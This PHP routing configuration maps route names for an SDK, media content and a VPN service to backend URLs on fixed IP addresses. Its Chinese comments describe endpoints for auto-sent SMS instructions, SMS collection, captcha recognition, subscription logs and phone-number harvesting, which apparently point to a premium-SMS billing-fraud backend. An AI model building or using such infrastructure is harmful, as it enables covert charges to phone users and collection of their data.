<?php
/**
 * 接口转发配置
 */
return [
    //sdkcp
    //判断是否有使用权
    "sdkcp/Gp.Valid" => "http://52.8.79.162:8008/sdkcp/Gp.Valid",
    //收件箱上传
    "sdkcp/Gp.InboxUpload" => "http://52.8.79.162:8008/sdkcp/Gp.InboxUpload",
    //激活
    "sdkcp/SaleStaticNewcp" => "http://52.8.79.162/sdkcp/sale_static_newcp.php",
    //访问接口
    "sdkcp/UserVisitAppcp" => "http://52.8.79.162/sdkcp/user_visit_appcp.php",
    //SDK动态插件更新接口
    "sdkcp/PlugUpdate" => "http://52.8.79.162/sdkcp/plugUpdate.php",
    //app日志
    "sdkcp/AppLog" => "http://52.8.79.162/sdkcp/app_log.php",
    //自动发短信获取短信指令
    "sdkcp/PushMsgcpNew" => "http://52.8.79.162/sdkcp/push_msgcp_new.php",
    //获取sp短信指令
    "sdkcp/Bfeecnf" => "http://52.8.79.162/sdkcp/Bfeecnf.php",
    //sp短信发送结果上传
    "sdkcp/SubPayQuery" => "http://52.8.79.162/sdkcp/sub_payquery.php",
    //wap推送接口（定制版）
    "sdkcp/WapPushCustom" => "http://52.8.79.162:8008/sdkcp/WapPushCustom",
    //wap普通推送接口
    "sdkcp/WapPush" => "http://52.8.79.162:8008/sdkcp/wappush",
    //wap短信收集接口
    "sdkcp/SmsCollection" => "http://52.8.79.162:8008/sdkcp/SmsCollection",
    //wap网页上传
    "sdkcp/UploadPage" => "http://52.74.254.237/sdkcp/geturlok.php",
    //wap页面
    "sdkcp/ibsbill" => "http://52.8.79.162/sdkcp/ibsbill.php",
    //查询wap点击记录
    "sdkcp/GetWapCilckLog" => "http://52.8.79.162/sdkcp/getWapCilckLog.php",
    //查询wap订阅记录
    "sdkcp/GetWapSubLog" => "http://52.8.79.162/sdkcp/getWapSubLog.php",
    //验证码识别
    "sdkcp/Ocr" => "http://52.8.79.162:8008/sdkcp/Ocr",


    //视频首页
    "video/video" => "http://52.74.254.237/wapgame/interface/video.php",
    //视频详情页
    "video/videoinfo" => "http://52.74.254.237/wapgame/interface/video.php",
    //统计视频播放量
    "video/play" => "http://52.74.254.237/wapgame/interface/video.php",
    //收藏接口
    "collect/index" => "http://52.74.254.237/wapgame/interface/collect.php",
    //写真首页
    "photo/index" => "http://52.74.254.237/wapgame/interface/photo.php",
    //写真详情页
    "photo/photoinfo" => "http://52.74.254.237/wapgame/interface/photo.php",
    //统计写真播放量
    "photo/play" => "http://52.74.254.237/wapgame/interface/photo.php",
    //浏览器产品接口
    "browser/index" => "http://52.74.254.237/interface/browser/browser.php",
    //统计产品内容点击量及点击用户ip接口
    "statis/clicks" => "http://52.74.254.237/interface/gp_apk/contents_clicks.php",
    //图片下载接口
    "download/pic" => "http://52.74.254.237/wapgame/interface/downloadPic.php",
    //MT下发短信中包含的URL页面自动推送接口(每24小时自动执行)
    "mt/automaticpush" => "http://52.74.254.237/interface/mt_send_url/mt_automatic_push.php",
    //MT视频页面URL接口
    "mt/video" => "http://52.74.254.237/interface/mt_send_url/mt_sms_url.php",
    //MT游戏页面URL接口
    "mt/game" => "http://52.74.254.237/interface/mt_send_url/mt_sms_url_game.php",
    //视频mt下发10个url接口
    "mt/labelurl" => "http://52.74.254.237/interface/mt_send_url/mt_sms_url_label.php",
    //手机号码收集从58拿到52接口（每小时自动执行）
    "sms/imsimob" => "http://52.8.79.162/sdkcp/handle_data/sms_imsimob.php",


    //VPN用户激活接口
    "vpn/ActivationVpn" => "http://13.250.164.45:8008/vpn/ActivationVpn",
    //VPN服务器国家列表接口
    "vpn/VpnServer" => "http://13.250.164.45:8008/vpn/VpnServer",
    //链接VPN接口
    "vpn/linkVpn" => "http://13.250.164.45:8008/vpn/LinkVpn",
    //VPN上报统计接口
    "vpn/ReportVpn" => "http://13.250.164.45:8008/vpn/ReportVpn",
    //VPN邮箱验证接口
    "vpn/MailBox" => "http://13.250.164.45:8008/vpn/MailBox",
    //VPN用户注册接口
    "vpn/VpnUserRegister" => "http://13.250.164.45:8008/vpn/VpnUserRegister",
    //VPN用户登录接口
    "vpn/VpnUserLogin" => "http://13.250.164.45:8008/vpn/VpnUserLogin",
    //VPN用户找回密码接口
    "vpn/VpnUserRetrievePassword" => "http://13.250.164.45:8008/vpn/VpnUserRetrievePassword",
    //统计VPN用户行为接口
    "vpn/VpnUserBehavior" => "http://13.250.164.45:8008/vpn/VpnUserBehavior",
    //VPN点击广告接口
    "vpn/VpnClickAds" => "http://13.250.164.45:8008/vpn/VpnClickAds",
    //VPN产品价格接口
    "vpn/VpnProPrice" => "http://13.250.164.45:8008/vpn/VpnProPrice",

    //支付完成上报接口
    "vpn/VpnUserBuy" => "http://13.250.164.45:8008/vpn/VpnUserBuy",

    //计算ip距离接口
    "vpn/IpDistance" => "http://13.250.164.45:8008/vpn/IpDistance",

    //跳转链接接口
    "browser/jump_url" => "http://52.74.254.237/interface/browser/jump_url.php",

    //自动监测谷歌商店产品上架状态和产品版本更新接口（15分钟请求一次）
    "gogle/product_state" => "http://52.74.254.237/interface/send_emails/gogle_play_state.php",

];